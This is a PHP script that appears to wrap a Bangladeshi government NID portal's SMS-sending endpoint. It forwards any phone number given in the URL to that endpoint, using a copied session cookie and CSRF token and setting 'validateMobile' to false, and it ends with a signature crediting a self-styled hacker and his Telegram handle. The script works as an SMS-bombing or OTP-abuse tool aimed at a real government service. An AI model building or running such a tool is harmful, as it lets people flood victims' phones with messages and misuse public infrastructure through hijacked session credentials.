<?php

// Check if the phone parameter is set in the GET request
if (isset($_GET['phone'])) {
    $phone = $_GET['phone'];
} else {
    die('Phone parameter is missing.');
}

// Format the phone number to ensure it's an 11-digit string starting with '0'
$phone = preg_replace('/\D/', '', $phone); // Remove non-digit characters

// Validate that the phone number is 11 digits and starts with '0'
if (strlen($phone) !== 11 || $phone[0] !== '0') {
    die('Invalid phone number. It must be an 11-digit number starting with 0.');
}

$url = 'https://services.nidw.gov.bd/nid-pub/claim-account/send-sms';

$headers = [
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.9,bn;q=0.8',
    'Connection: keep-alive',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'Cookie: JSESSIONID="gPtKC_BEAbznXSfqZBf8IfTeK_f3pvgFug9GXk2R.slave2:PUB_MSRV032"; locale=en; SERVERID=bec-pub08',
    'Origin: https://services.nidw.gov.bd',
    'Referer: https://services.nidw.gov.bd/nid-pub/claim-account',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'X-CSRF-TOKEN: ccb0f8c4-b279-4dab-852d-efbec9868b5b',
    'X-Requested-With: XMLHttpRequest',
    'sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
];

// Prepare the data to send, including the phone parameter
$data = http_build_query([
    'validateMobile' => 'false',
    'phone' => $phone, // Add the phone parameter here
]);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Curl error: ' . curl_error($ch);
} else {
    // Output success response
    echo "Api Owner : Mɾ. Jҽɾɾყ 😈<br>";
    echo "Telegram : t.me/Mr_Jerry_Hacker";
}

// Close cURL session
curl_close($ch);
?>
